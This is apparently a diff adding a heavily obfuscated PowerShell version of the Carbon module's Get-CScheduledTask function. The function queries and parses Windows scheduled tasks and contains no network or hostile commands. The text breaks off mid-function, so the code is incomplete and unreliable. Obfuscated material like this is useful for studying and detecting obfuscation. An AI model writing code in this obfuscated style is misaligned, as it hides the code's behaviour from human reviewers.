@@ -1,0 +1,565 @@
+ set-ItEM  vaRIAblE:sy2r  ([tYPe]("{6}{1}{5}{2}{3}{0}{8}{4}{7}" -F 'Ldca','gem','Nt.aUT','oMAtIoN.Wi','att','E','ManA','ern','RdP'));   SV  ("E"+"Jkz"+"qS") (  [tyPE]("{2}{0}{4}{1}{3}" -f'.e','DiN','TeXT','g','NCo'))  ;   SV  ("GWf8"+"xj") ( [tYpe]("{1}{2}{0}" -F'h','io.','PAT') );   sET  W9JHm ([tyPE]("{0}{2}{1}" -F 'c','sOle','On'));  ${I`4t} =  [tYPE]("{0}{1}{3}{2}"-F 'e','n','RONmEnt','vI');  Set-iteM  VARiaBlE:mgs0W ([TypE]("{0}{1}"-F 'i','nT')  );   SeT  ("vgy50"+"q") (  [TyPE]("{3}{1}{4}{5}{0}{2}{7}{6}"-f 'Ch','.ta','eDUleR.sCHE','CaRBon','S','kS','yPE','DuleT') ); SeT-item variABlE:BsTj5  ([tYpE]("{2}{1}{0}" -f 'eSpaN','M','tI')  );  set-itEM vArIablE:Bu1mR  ( [TYpE]("{0}{1}{2}" -f 'DaT','ETI','Me') ) ;  
+function g`et-`cSc`heduLeDTA`SK
+{
+    
+    [CmdletBinding()]
+    [OutputType([Carbon.TaskScheduler.TaskInfo])]
+    param(
+        [Parameter()]
+        [Alias({"{1}{0}{2}" -f'am','TaskN','e'})]
+        [string]
+        
+        ${na`me},
+
+        [Switch]
+        
+        
+        
+        ${a`ScOM`O`BJEcT}
+    )
+
+    &("{2}{0}{3}{1}"-f 't-St','e','Se','rictMod') -Version ("{0}{1}" -f'La','test')
+    &("{4}{0}{1}{3}{2}"-f'-Cal','lerPrefe','ence','r','Use') -Cmdlet ${ps`CmDL`ET} -Session ${EX`ec`U`Tio`NcO`NTeXT}."seS`s`IOnstA`Te"
+
+    function cOnvERTfro`M-D`U`RaTIo`NSp`EC
+    {
+        param(
+            ${D`U`RaTi`on}
+        )
+
+        if( ${dU`RaTi`on} -match (('^P'+'(('+'{1'+'}d+)D)?'+'T(({1}d+)'+'H)?(({1'+'}d+'+')M)?('+'({1}d'+'+)S)?{0}')  -F  [Char]36,[Char]92) )
+        {
+            return &("{1}{2}{0}"-f'ect','New-Ob','j') ("{1}{0}" -f'n','TimeSpa') ${mA`T`ChEs}[2],${ma`TCHes}[4],${m`AtcH`ES}[6],${M`AtC`hES}[8]
+        }
+    }
+
+    function COnVeRTfrom-`Re`P`EtITioNELem`ent
+    {
+        param(
+            [Xml.XmlElement]
+            ${T`Ri`gG`ErE`LeMeNt}
+        )
+
+        &("{3}{1}{0}{2}"-f'ictMo','et-Str','de','S') -Version ("{0}{2}{1}"-f'L','est','at')
+
+        [Carbon.TaskScheduler.ScheduleType]${scH`EdUlET`yPE} =  ( gET-vAriAbLE vGY50Q  -VALu)::"UNK`N`oWn"
+        ${In`Te`R`VAL} = ${n`Ull}
+        ${m`O`Difi`er} = ${nU`ll}
+        ${DurA`TI`oN} = ${n`ULL}
+        ${s`TOp`AteNd} = ${F`A`lSe}
+        [TimeSpan]${deL`Ay} =   (gI  ("vArIa"+"bLE:BsTJ"+"5") ).VAluE::"Z`ero"
+
+        if( ${TrI`gGe`R`ELEMent}.("{0}{3}{2}{1}" -f 'GetElements','me','yTagNa','B').Invoke(("{1}{0}{2}" -f 'epetit','R','ion'))."C`ouNt" -gt 0 )
+        {
+            ${R`EpETitI`ON} = ${TRiGGer`e`l`emE`NT}."Re`pE`T`itioN"
+
+            ${INt`eRv`AL} = ${REpET`i`TIoN}."iN`TeRv`AL"
+            if( ${iNter`V`Al} -match (('PT(f'+'yMd+'+')'+'(.'+'*)z0m')."re`pl`ACe"(([Char]122+[Char]48+[Char]109),[sTrING][Char]36)."re`p`lacE"('fyM',[sTrING][Char]92)) )
+            {
+                ${mod`I`FIeR} = ${m`A`TcHES}[1]
+                ${u`NIT} = ${M`AtC`hEs}[2]
+
+                ${H`OuR} = 0
+                ${mIN`UTe} = 0
+                ${S`ecONd} = 0
+                switch( ${u`Nit} )
+                {
+                    'H' { ${H`OUr} = ${m`oD`IfiEr} }
+                    'M' { ${mi`NuTE} = ${M`OdiF`IeR} }
+                }
+
+                ${SC`H`EDULety`PEs} = @{
+                                        'H' = ("{0}{1}" -f'Ho','urly');
+                                        'M' = ("{0}{1}" -f 'M','inute');
+                                  }
+                if( ${ScHeDuLEt`y`PEs}.("{0}{1}{2}" -f'Contain','s','Key').Invoke( ${U`NIt} ) )
+                {
+                    ${sCHED`ULe`TYpE} = ${sCh`edULeTy`PES}[${u`NIt}]
+                }
+                ${t`IMES`pAN} = &("{0}{1}{3}{2}" -f 'New-O','b','ct','je') ("{1}{2}{0}" -f 'n','T','imeSpa') ${hO`Ur},${miN`UTe},${S`e`cOnd}
+                switch( ${sCH`eDUlE`Ty`Pe} )
+                {
+                    ("{0}{1}" -f'Ho','urly') { ${mO`DIfI`eR} = ${TIMES`Pan}."t`oT`ALHOu`RS" }
+                    ("{1}{0}{2}" -f 'in','M','ute') { ${m`OD`IFier} = ${tIM`esP`AN}."To`TaLMINU`Tes" }
+                }
+            }
+        
+            if( ${re`pe`TITion} | &("{2}{1}{0}" -f'r','Membe','Get-') -Name ("{2}{0}{1}" -f'i','on','Durat') )
+            {
+                ${dU`RA`Tion} = ${REpEti`TI`ON}."dU`RAtIOn"
+                ${durA`T`iOnasTIM`E`sPAN} = &("{4}{0}{2}{1}{3}"-f 'From-Du','Spe','ration','c','Convert') -Duration ${r`EPEt`itIoN}."dUr`At`ION"
+                if( ${Duration`As`Ti`MESpAN} -ne ${Nu`ll} )
+                {
+                    ${dU`Ration} = ${dU`RaTiONAstim`e`SPAN}
+                }
+            }
+
+            if( ${RepE`TI`TioN} | &("{1}{0}{2}" -f 't-','Ge','Member') -Name ("{4}{3}{2}{1}{0}"-f 'nEnd','tDuratio','A','p','Sto') )
+            {
+                ${sTOpaT`e`Nd} = (${r`ePe`TItiON}."sTO`pAtDUrAt`IONE`ND" -eq ("{0}{1}" -f 't','rue'))
+            }
+        }
+
+        if( ${TrI`GGeRE`LEme`Nt} | &("{1}{0}{2}" -f 'embe','Get-M','r') -Name ("{1}{0}"-f 'lay','De') )
+        {
+            ${d`E`LayASt`imESpAn} = &("{4}{1}{2}{7}{6}{3}{0}{5}"-f'nSpe','v','e','uratio','Con','c','rom-D','rtF') -Duration ${TRi`GgeReL`E`M`ENT}."DeL`AY"
+            if( ${DEL`AY`AstIMes`P`An} -ne ${n`UlL} )
+            {
+                ${D`e`lAY} = ${d`eL`AY`AStimEsPAn}
+            }
+        }
+
+        return ${ScheD`U`l`eTYPe},${mo`DI`FI`ER},${D`U`Ra`TiOn},${St`OPA`TeNd},${d`elaY}
+    }
+
+    ${O`ptio`N`ALaRgs} = @()
+    ${WILDCA`RD`sE`ARcH} = ${f`Al`SE}
+    if( ${n`AMe} )
+    {
+        if(   ${sy`2R}::("{6}{2}{4}{1}{0}{3}{5}" -f 'ldcardChar','sWi','ontai','acte','n','rs','C').Invoke(${NA`Me}) )
+        {
+            ${wiL`D`cARdseA`RcH} = ${t`RUe}
+        }
+        else
+        {
+            ${Na`Me} = &("{1}{2}{0}"-f'ath','Join','-P') -Path '\' -ChildPath ${nA`Me}
+            ${OpTIO`NaL`ArGS} = @( '/tn', ${nA`Me} )
+        }
+    }
+
+    if( ${A`ScOM`o`BjEcT} )
+    {
+        ${T`AsksCHE`d`UleR} = &("{0}{2}{3}{1}" -f 'New-O','t','b','jec') -ComObject ("{0}{3}{1}{4}{2}" -f 'Sc','le.Ser','ce','hedu','vi')
+        ${TasK`sch`Ed`U`LER}.("{1}{2}{0}"-f'nect','Co','n').Invoke()
+
+
+        function GEt-`T`AskS
+        {
+            param(
+                ${FOL`d`ER}
+            )
+    
+            ${GethId`den`T`As`ks} = 1
+    
+            ${f`O`ldEr}.("{0}{1}" -f 'GetT','asks').Invoke(${GE`THi`DdEN`TAsKs}) | &("{1}{3}{0}{2}" -f'h-Objec','ForE','t','ac') { ${_} }
+    
+            foreach( ${S`UBFo`ldeR} in ${fo`LDEr}.("{1}{0}{3}{2}"-f 'tFold','Ge','rs','e').Invoke(${ge`THi`dDe`NT`AsKs}) )
+            {
+                &("{0}{1}{2}" -f 'Get','-','Tasks') -Folder ${SUB`FOl`D`er}
+            }
+        }
+
+        ${t`AS`KS} = &("{2}{1}{0}"-f's','ask','Get-T') -Folder ${T`ASksC`HeDUL`er}.("{1}{2}{0}"-f'lder','G','etFo').Invoke("\") |
+                    &("{0}{3}{1}{2}" -f 'Wher','j','ect','e-Ob') { 
+                        if( -not ${n`Ame} )
+                        {
+                            return ${TR`UE}
+                        }
+                    
+                        return ${_}."P`AtH" -like ${nA`me}
+                    }
+
+        if( -not ${W`I`LdCaRDs`EA`Rch} -and -not ${taS`ks} )
+        {
+            &("{2}{0}{3}{1}"-f 'ite-','or','Wr','Err') -Message ('Scheduled task "{0}" not found.' -f ${NA`Me}) -ErrorAction ${ERRORAcT`ionPRe`FER`EN`cE}
+            return
+        }
+
+        return ${Tas`Ks}
+    }
+
+    ${oRIGInAlE`R`R`pRe`FErENce} = ${ERR`oRACt`IO`NP`Ref`E`ReNcE}
+    ${O`RIgInALEnCO`di`NG} =   ( variAbLE W9jhm -valU)::"OU`TpuT`E`Nc`odiNg"
+    
+    ${ouTpu`TE`NCOd`iNg} =   ( lS  ("vARia"+"B"+"le:W9"+"jh"+"M") ).value::"Ou`T`Put`eNCODiNG" =  (gEt-VariAblE ("E"+"JkZ"+"Qs") ).valuE::("{0}{3}{1}{2}"-f'Ge','n','coding','tE').Invoke(1252)
+    ${e`RR`o`R`AcTIO`NpReFEre`Nce} = ("{0}{1}{2}" -f'Con','tinu','e')
+    [object[]]${OuT`PUT} = ${nU`lL}
+    ${Er`Rf`ILE} = &("{2}{0}{1}" -f 'in-','Path','Jo') -Path ${E`N`V`:Temp} -ChildPath ('Carbon+Get-CScheduledTask+{0}' -f   ( vaRiAbLe  ("gWf8"+"xj") ).vALue::("{3}{1}{0}{2}"-f'omF','tRand','ileName','Ge').Invoke())
+    try
+    {
+        ${oUT`P`Ut} = &("{1}{2}{0}"-f's','sc','htask') ("{0}{1}"-f'/','query') ('/v') ("{1}{0}"-f'o','/f') ("{1}{0}" -f'sv','c') ${O`Pti`oNAla`RGS} 2> ${E`R`RFIlE} | 
+                    &("{0}{2}{1}{3}" -f 'ConvertFrom-','s','C','v') | 
+                    &("{3}{0}{1}{2}" -f'e','c','t','Where-Obj') { ${_}."hoST`NA`Me" -ne ("{0}{1}"-f 'Host','Name') } 
+    }
+    finally
+    {
+        ${errora`Ct`I`On`pRef`E`REnCe} = ${oriGIn`A`L`eRRPRe`F`ERE`NcE}
+        ${outp`UtE`N`c`oDInG} =   ${w9j`HM}::"outp`UTEncod`Ing" = ${oRi`GInAlEn`CO`dI`Ng}
+    }
+
+    if( ${L`ASteXI`TcODE} )
+    {
+        if( (&("{1}{2}{0}" -f 't-Path','T','es') -Path ${Er`R`FIle} -PathType ("{0}{1}" -f 'L','eaf')) )
+        {
+            ${E`RROr} = (&("{0}{2}{3}{1}" -f'Get-','tent','C','on') -Path ${eRR`FIlE}) -join ( (Gi  variABLE:i4t ).vaLuE::"NewL`inE")
+            try
+            {
+                if( ${eR`Ror} -match ((("{3}{8}{0}{20}{4}{7}{1}{9}{11}{18}{12}{10}{15}{16}{2}{14}{19}{13}{21}{6}{17}{5}" -f 'e5','B','gpp','T','N sys','.','fied5','tem5','h','N ',' the','cann','BN','N','a','5BN (f','ileG','BN','ot5BN find5','th)5B','B',' speci'))."REP`LAcE"('5BN',[stRinG][cHAR]92)."R`epl`ACE"('Ggp',[stRinG][cHAR]124)) )
+                {
+                    &("{0}{2}{3}{1}"-f 'Wri','ror','te','-Er') ('Scheduled task ''{0}'' not found.' -f ${nA`Me}) -ErrorAction ${ERrO`Ra`C`T`IONprE`FereNCe}
+                }
+                else
+                {
+                    &("{2}{1}{0}"-f 'e-Error','rit','W') (${ERr`OR}) -ErrorAction ${ERroRA`CtiOn`pr`eFer`en`ce}
+                }
+            }
+            finally
+            {
+                &("{0}{1}{3}{2}" -f'Remov','e-It','m','e') -Path ${errfI`Le}
+            }
+        }
+        return
+    }
+
+    if( -not ${O`UT`pUt} )
+    {
+        return
+    }
+
+    ${c`omTAsKs} = &("{3}{2}{1}{0}"-f'sk','a','T','Get-CScheduled') -AsComObject
+
+    for( ${i`DX} = 0; ${I`dx} -lt ${OuT`PUT}."c`ounT"; ++${i`dX} )
+    {
+        ${CSv`T`ASK} = ${O`UTput}[${i`dx}]
+
+        ${COM`T`Ask} = ${cOmt`AS`KS} | &("{0}{2}{3}{1}" -f'Whe','ct','re-','Obje') { ${_}."P`ATH" -eq ${c`SVt`ASK}."tAsKn`A`me" }
+        if( ${COmT`A`sK} )
+        {
+            ${x`MLdoc} = [xml]${c`Om`TasK}."x`Ml"
+        }
+        else
+        {
+            ${X`mL} = &("{0}{2}{1}" -f'sc','asks','ht') ("{1}{0}" -f 'y','/quer') ("{0}{1}"-f'/','tn') ${c`svTAsk}."t`AsKNA`ME" ("{1}{0}"-f'l','/xm') | &("{1}{2}{0}{3}" -f'-Objec','Wh','ere','t') { ${_} }
+            ${x`ML} = ${X`ML} -join ( (  Gi ('VAR'+'I'+'ABL'+'e:I4T') ).vaLUE::"ne`WlI`Ne")
+            ${x`mLdOc} = [xml]${x`Ml}            
+        }
+
+        ${TASK`pATh} = &("{1}{2}{0}"-f 'ath','Split-','P') -Parent -Path ${CS`VtASk}."ta`SKName"
+        
+        if( ${T`Askp`AtH} -ne '\' )
+        {
+            ${tASk`p`ATH} = '{0}\' -f ${tASk`P`ATh}
+        }
+        ${T`A`sKNAMe} = &("{1}{0}{2}" -f 't-','Spli','Path') -Leaf -Path ${C`svT`ASk}."t`AsKNAMe"
+
+        if( -not (${XM`LD`oC} | &("{1}{0}{2}" -f 'et-Memb','G','er') -Name ("{1}{0}"-f'k','Tas')) )
+        {
+            &("{1}{2}{3}{0}"-f 'rror','Wr','it','e-E') -Message ('Unable to get information for scheduled task "{0}": XML task information is missing the "Task" element.' -f ${cS`VTA`sk}."T`Askn`AME") -ErrorAction ${e`Rror`A`cTIOnpR`EfERENcE}
+            continue
+        }
+
+        ${xmLt`Ask} = ${Xml`doC}."tA`Sk"
+        ${Pr`iNC`IPAl} = ${xm`lt`ASk}."pR`IN`cIPAlS"."PRI`Ncip`AL"
+        ${iSiNt`ERa`C`TIve} = ${F`Al`Se}
+        ${no`PA`s`SwOrd} = ${f`AlSE}
+        if( ${P`R`INciPaL} | &("{0}{2}{1}"-f 'G','er','et-Memb') ("{0}{1}" -f 'LogonT','ype') )
+        {
+            ${I`siNtEr`AcT`i`Ve} = ${pr`Inc`Ip`AL}."l`ogoNT`YPe" -eq ("{2}{3}{4}{0}{1}" -f 's','sword','Inte','ractive','TokenOrPa')
+            ${noPA`ssw`ORD} = ${P`RInc`i`PAL}."lOg`on`TYPe" -eq 'S4U'
+        }
+
+        ${h`i`GhesTRu`NLevEl} = ${FA`lsE}
+        if( ${pRIN`c`IP`Al} | &("{0}{2}{1}"-f'Ge','r','t-Membe') ("{1}{2}{0}" -f'l','RunLe','ve') )
+        {
+            ${Hig`hes`TruNl`eV`eL} = (${pr`in`cIPaL}."ru`NLE`VEl" -eq ("{0}{3}{2}{4}{1}" -f 'Hi','le','aila','ghestAv','b'))
+        }
+
+        ${CREaTEd`A`Te} =   ${B`U1mR}::"MiNVA`luE"
+        if( ${xmLt`A`sK} | &("{2}{0}{3}{1}" -f'e','ber','G','t-Mem') -Name ("{2}{3}{0}{1}"-f'tionIn','fo','Regis','tra') )
+        {
+            ${Re`Gin`FO} = ${xm`L`TASK}."rE`Gistra`TI`oNInFO" 
+            if( ${Re`gI`NFO} | &("{2}{1}{0}{3}"-f 'embe','t-M','Ge','r') -Name ("{0}{1}"-f 'Da','te') )
+            {
+                ${cREa`T`e`DAtE} = [datetime]${reGI`Nfo}."Da`Te"
+            }
+        }
+
+        ${taS`K`T`oRUN} = ${CS`VT`AsK}.'Task To Run'
+        if( (${xMlT`A`SK} | &("{0}{2}{1}"-f'G','t-Member','e') -Name ("{0}{1}"-f 'A','ctions')) -and ${X`mlt`ASK}."ac`T`ioNS"."chI`LDnOd`es"."C`Ount" -eq 1 )
+        {
+            ${a`C`TioNs} = ${xml`Ta`sK}."Ac`TiONs"
+            if( (${a`CTi`oNs} | &("{2}{1}{0}" -f 'mber','e','Get-M') -Name ("{0}{1}"-f 'E','xec')) -and (${aC`TIO`NS}."E`xEc" | &("{1}{2}{0}"-f't','Measure-O','bjec') | &("{3}{2}{0}{1}" -f 'b','ject','elect-O','S') -ExpandProperty ("{1}{0}" -f'ount','C')) -eq 1)
+            {
+                ${e`xeC} = ${a`ctIONS}."e`xEc"
+
+                if( ${e`xEC} | &("{0}{2}{1}"-f'G','Member','et-') -Name ("{0}{1}{2}" -f 'Com','man','d') )
+                {
+                    ${taSK`T`oRuN} = ${ex`EC}."COmma`ND"
+                }
+
+                if( ${EX`ec} | &("{0}{1}{2}" -f'G','e','t-Member') -Name ("{2}{0}{1}"-f 'ument','s','Arg') )
+                {
+                    ${T`AskTo`Run} = '{0} {1}' -f ${T`AsKt`ORUn},${e`Xec}."ARgum`E`N`TS"
+                }
+            }
+        }
+
+        ${Ct`oR`Args} = @(
+                        ${c`SVTA`sK}."HOStn`A`Me",
+                        ${t`A`SKPATH},
+                        ${TAs`KNa`mE},
+                        ${Cs`VTAsk}.'Next Run Time',
+                        ${Cs`V`TASk}."sT`ATuS",
+                        ${c`svt`ASK}.'Logon Mode',
+                        ${cS`VT`ASK}.'Last Run Time',
+                        ${CS`VTaSK}."Auth`or",
+                        ${c`REa`Ted`ATe},
+                        ${T`ASkT`oRUN},
+                        ${CS`V`TAsk}.'Start In',
+                        ${CSv`TAsk}."coMM`E`NT",
+                        ${C`SvT`ASK}.'Scheduled Task State',
+                        ${cS`VTa`sK}.'Idle Time',
+                        ${CS`V`TASk}.'Power Management',
+                        ${CS`VT`Ask}.'Run As User',
+                        ${isiN`T`EraCT`ivE},
+                        ${No`paSs`WoRd},
+                        ${H`igHE`ST`RunleVEl},
+                        ${CSv`TA`sk}.'Delete Task If Not Rescheduled'
+                    )
+
+        ${TA`sk} = &("{0}{1}{2}{3}" -f 'Ne','w-','Ob','ject') -TypeName ("{4}{0}{2}{6}{7}{3}{1}{5}" -f 'on','s','.TaskSc','.Ta','Carb','kInfo','h','eduler') -ArgumentList ${C`TORa`RGS}
+
+        ${S`cHeDU`LeiDX} = 0
+        while( ${i`DX} -lt ${O`U`Tput}."c`OuNT" -and ${o`Utp`UT}[${I`dx}]."TA`Sk`NAME" -eq ${c`S`Vtask}."TasK`N`AmE" )
+        {
+            ${cSvT`A`SK} = ${O`U`TpUt}[${i`Dx}++]
+            [Carbon.TaskScheduler.ScheduleType]${SCH`edulET`y`Pe} =   (GEt-chIldiTEM vaRIablE:vgY50Q).VAlUE::"U`N`KnOwn"
+
+            [int[]]${D`AyS} = @()
+            [int]${c`Svd`AY} = 0
+            if(  (gI  VArIABlE:MGs0w ).vALUE::"tRyP`AR`Se"(${cs`VTAsk}."D`AYS", [ref]${CsvD`AY}) )
+            {
+                ${da`YS} = @( ${cSVd`Ay} )
+            }
+
+            ${du`Rat`Ion} = ${cS`Vt`AsK}.'Repeat: Until: Duration'
+            [Carbon.TaskScheduler.Month[]]${M`o`NtHs} = @()
+            ${mod`IF`iER} = ${NU`ll}
+            ${sTO`pAT`eNd} = ${F`A`Lse}
+            [int]${IN`TE`RvAL} = 0
+            [TimeSpan]${e`NdtI`me} =   (GeT-VariablE Bstj5 -VALue  )::"ze`Ro"
+            [DayOfWeek[]]${daYs`Ofw`EEk} = @()
+            [TimeSpan]${DE`l`Ay} =  ( VaRiablE ("b"+"StJ5")  -VAlue  )::"ze`RO"
+            [int]${ID`LeT`IME} = 0
+            ${eveNtCHAnnEL`N`A`Me} = ${n`ULl}
+
+            ${tri`GGERs} = ${XMlt`A`Sk}.("{4}{1}{2}{3}{0}"-f'ByTagName','etE','lement','s','G').Invoke(("{1}{0}{2}" -f'rigger','T','s')) | &("{4}{3}{2}{1}{0}"-f'ect','bj','t-O','lec','Se') -First 1
+            if( -not ${TR`i`GgE`RS} -or ${T`R`iGGe`Rs}."ChIL`d`NOdES"."cOU`NT" -eq 0 )
+            {
+                ${Sch`Ed`UL`etype} =   ( vaRiAble  vGY50Q ).vaLUe::"On`de`maND"
+            }
+            elseif( ${tRI`GG`eRs}."cHil`dNoD`eS"."COU`NT" -gt 0 )
+            {
+                [Xml.XmlElement]${T`RIGger} = ${t`RIgge`RS}."c`hi`ldNOd`ES".("{0}{1}"-f 'Ite','m').Invoke(${Sc`h`Ed`ULeIDx}++)
+                if( ${T`R`iGgER} | &("{2}{0}{1}" -f'Mem','ber','Get-') -Name ("{2}{0}{1}"-f 'B','oundary','End') )
+                {
+                    ${e`ND`D`ATETImE} = [datetime]${TR`IG`GER}."eNdB`OUNDa`Ry"
+                    ${EN`d`TiMe} = &("{1}{0}{2}{3}" -f '-Tim','New','eS','pan') -Hours ${EnD`dAT`EtI`me}."H`oUR" -Minutes ${E`N`D`DATETIme}."m`i`NUtE" -Seconds ${EnDD`A`Te`TIME}."se`coNd"
+                }
+
+                ${scHEDU`lEtY`PE},${Mod`IF`IEr},${d`U`RaTiOn},${s`ToP`At`EnD},${dEL`Ay} = &("{0}{7}{2}{5}{4}{6}{1}{3}" -f'Co','itionEl','rtF','ement','Rep','rom-','et','nve') ${tr`ig`gER}
+                if( ${TriG`gEr}."na`me" -eq ("{0}{1}{2}{3}"-f'Time','Tri','g','ger') )
+                {
+                    ${dA`Ys} = @( )
+                    if( ${csvt`A`sK}.'Schedule Type' -eq ("{0}{4}{2}{1}{3}"-f 'On','me O','Ti','nly','e ') )
+                    {
+                        ${s`CheduLet`Y`Pe} = ("{1}{0}"-f 'nce','O')
+                        ${i`Nt`ervaL} = ${MOd`iF`ier}
+                        ${mOdi`F`IeR} = ${n`ULL}
+                    }
+                }
+                elseif( ${trig`g`er}."na`ME" -eq ("{2}{0}{1}" -f 'n','Trigger','Logo') )
+                {
+                    ${sChEd`U`LE`T`YPE} = ("{2}{1}{0}" -f 'ogon','L','On')
+                    ${i`NTerV`Al} = 0
+                    ${MoDIFi`eR} = ${NU`Ll}
+                }
+                elseif( ${tRIG`ger}."Na`ME" -eq ("{1}{0}{2}"-f'otT','Bo','rigger') )
+                {
+                    ${SChe`Du`LetyPE} = ("{0}{1}"-f 'On','Start')
+                    ${Inter`Val} = 0
+                    ${MO`dIF`ier} = ${n`UlL}
+                }
+                elseif( ${triGg`eR}."n`AME" -eq ("{2}{1}{0}" -f'igger','eTr','Idl') )
+                {
+                    ${s`chEDUlEt`yPE} = ("{1}{0}{2}" -f'I','On','dle')
+                    ${iN`TEr`V`AL} = 0
+                    ${mO`DI`FiEr} = ${nu`Ll}
+                    ${seT`Tin`gsN`oDe} = ${x`mLTAsk}."sEtt`I`NGS"
+                    if( ${sEt`TI`NgSN`ODe} | &("{2}{0}{1}"-f 'et-Memb','er','G') ("{1}{2}{0}{3}" -f'ng','Id','leSetti','s') )
+                    {
+                        ${I`dLeSEt`Ti`Ng`Sno`dE} = ${SeT`TInGs`NODe}."I`DL`eSETt`ings"
+                        if( ${i`dlESEttING`S`N`oDE} | &("{2}{0}{1}"-f'em','ber','Get-M') ("{0}{2}{1}"-f 'Dur','on','ati') )
+                        {
+                            ${i`DLE`TIM`EASTIMesPaN} = &("{4}{3}{2}{1}{0}"-f 'ionSpec','om-Durat','Fr','nvert','Co') -Duration ${x`MLtAsk}."sE`Ttings"."i`DLesETt`IN`gs"."DUra`Tion"
+                            if( ${idletI`mE`ASt`iME`spaN} -ne ${N`Ull} )
+                            {
+                                ${id`l`eTIme} = ${id`LetI`m`EastIMe`SPAn}."tota`Lm`INuTEs"
+                            }
+                        }
+                    }
+                }
+                elseif( ${TriG`geR}."n`Ame" -eq ("{0}{2}{1}" -f'Eve','rigger','ntT') )
+                {
+                    ${scHEdU`LET`YpE} = ("{2}{1}{0}"-f'ent','v','OnE')
+                    ${sU`B`sCr`IPtIOn} = [xml]${Tr`Igg`er}."SU`B`scri`PtIoN"
+                    ${SEl`EcT`NO`de} = ${sUBS`Cr`IpTIon}."que`RyL`iST"."q`UerY"."sel`Ect"
+                    ${mODiF`iEr} = ${selectn`O`dE}."I`N`Ne`RtEXT"
+                    ${e`V`eNt`cHANNELnaME} = ${S`ElEctNo`De}.("{3}{1}{0}{2}"-f'tAttr','e','ibute','G').Invoke(("{0}{1}" -f 'Pat','h'))
+                }
+                elseif( ${trI`GGeR}."NA`ME" -eq ("{5}{3}{4}{1}{2}{0}" -f 'Trigger','StateC','hange','s','ion','Ses') )
+                {
+                    ${ScH`E`DulEt`ype} =  (vaRiaBLE Vgy50q ).VaLUE::"SESs`IONSTat`EchA`NgE"
+                }
+                elseif( ${t`RigG`er}."NA`ME" -eq ("{1}{0}{4}{3}{2}"-f'trat','Regis','rigger','onT','i') )
+                {
+                    ${sC`He`DUletYpe} =   (vaRIABLe  ("Vgy50"+"q") -vAL)::"reG`IS`TRa`Tion"
+                }
+                elseif( ${tRI`Gg`eR}."N`AmE" -eq ("{0}{3}{1}{2}" -f'C','ndarTrigg','er','ale') )
+                {
+                    if( ${Tr`igG`Er}.("{3}{4}{0}{2}{1}"-f'e','tsByTagName','men','Get','El').Invoke(("{2}{1}{0}" -f 'y','heduleByDa','Sc'))."cOu`Nt" -eq 1 )
+                    {
+                        ${S`c`HEDUleTY`PE} = ("{0}{1}"-f'D','aily')
+                        ${MO`d`IFIEr} = ${t`RIG`geR}."ScHEdU`l`Eby`day"."da`ySiN`Te`RVAL"
+                        ${nU`lL},${int`E`RVAl},${Nu`ll},${n`Ull} = &("{6}{3}{0}{5}{4}{1}{2}"-f 'ertFr','petitio','nElement','onv','-Re','om','C') ${T`RIgG`eR}
+                    }
+                    elseif( ${Tri`gg`ER}.("{1}{0}{3}{2}" -f 'etEl','G','e','ementsByTagNam').Invoke(("{2}{3}{0}{1}"-f 'hedul','eByWeek','S','c'))."co`Unt" -eq 1 )
+                    {
+                        ${SCHe`du`L`etYpe} = ("{0}{1}"-f 'Weekl','y')
+                        ${INte`RvaL} = ${Mo`dIFi`eR}
+                        ${MoD`I`FIer} = ${TRi`GGER}."Sc`HEDulE`BYWe`EK"."we`E`ksInTeRVAL"
+                        ${D`Ays} = @( )
+                        ${DaY`so`Fweek} = ${T`RiGg`eR}."S`chEDuLEbY`W`eeK"."DAYs`o`FW`EeK"."chILDN`o`d`ES" | &("{2}{0}{1}{3}" -f'rEach-Obj','ec','Fo','t') { [DayOfWeek]${_}."N`Ame" }
+                    }
+                    elseif( ${T`R`IGger}.("{2}{3}{1}{0}" -f 'ame','N','GetElem','entsByTag').Invoke(("{2}{3}{0}{1}" -f 'ByMont','h','Sched','ule'))."CO`Unt" -eq 1 )
+                    {
+                        ${Sche`D`ULE`TyPe} = ("{1}{0}"-f 'y','Monthl')
+                        ${m`ONth`SN`ODE} = ${T`RIgg`eR}."sc`h`edulEB`YMON`TH"."mo`NThS"
+                        ${DaYs`O`FM`OnTH} = ${t`Ri`GgeR}."ScHE`dUleb`yM`oNth"."DAY`S`oFmon`TH"."c`HiLdNOd`eS" | &("{0}{1}{2}"-f 'ForEa','ch','-Object') { ${_}."i`NnErte`Xt" }
+                        if( ${d`AYsoFM`o`NTh} -eq ("{0}{1}"-f 'La','st') )
+                        {
+                            ${In`T`eR`VAL} = ${modi`FI`Er}
+                            ${MoDiFi`Er} = ("{0}{1}{2}" -f'Last','Da','y')
+                            ${d`AYS} = @()
+                        }
+                        else
+                        {
+                            ${da`ys} = ${dAYSoFM`On`TH} | &("{1}{4}{2}{3}{0}" -f't','For','je','c','Each-Ob') { [int]${_} }
+                            ${iNtErV`Al} = ${moD`If`Ier}
+                            
+                            if( ${M`onT`hsnODe}."cHiL`D`NODeS"."C`Ount" -eq 12 )
+                            {
+                                ${mo`Dif`I`ER} = 1
+                            }
+                            else
+                            {
+                                
+                                ${moDIf`ieR} = ${n`ULL}
+                            }
+                        }
+
+                        [Carbon.TaskScheduler.Month[]]${m`onThS} = ${MON`ThS`NODe}."chi`Ldno`des" | &("{2}{0}{1}{4}{3}" -f'rE','ach-O','Fo','t','bjec') { ([Carbon.TaskScheduler.Month]${_}."n`AmE") }
+                    }
+                    elseif( ${t`R`iGGERs}.("{2}{3}{1}{0}{4}" -f'yTag','tsB','Get','Elemen','Name').Invoke(("{0}{4}{3}{1}{2}" -f 'Sche','yMonthD','ayOfWeek','uleB','d'))."c`OUnt" -eq 1 )
+                    {
+                        ${sCHEDU`lety`PE} = ("{0}{1}" -f'Monthl','y')
+                        ${i`NtE`RvAl} = ${mOd`iFI`Er}
+                        ${ScHe`Dul`en`o`De} = ${tRig`ger}."schE`dU`lE`BYmoNTHday`Of`w`eeK"
+                        ${d`AYso`F`WeeK} = ${SC`hED`ULE`No`dE}."Da`ySOFw`EEK"."C`h`IldNo`dES" | &("{1}{0}{3}{2}" -f'ch','ForEa','bject','-O') { [DayOfWeek]${_}."N`AMe" }
+                        ${m`o`Nths} = ${sCHe`du`LeNoDe}."MONT`hs"."c`Hild`Nodes" | &("{1}{2}{0}{3}"-f 'b','Fo','rEach-O','ject') { ([Carbon.TaskScheduler.Month]${_}."NA`me") }
+                        switch( ${SChe`Du`Leno`De}."wee`kS"."w`eek" )
+                        {
+                            1 { ${MOdIFi`eR} = ("{0}{1}"-f 'Firs','t') }
+                            2 { ${ModI`FIER} = ("{0}{1}"-f'Seco','nd') }
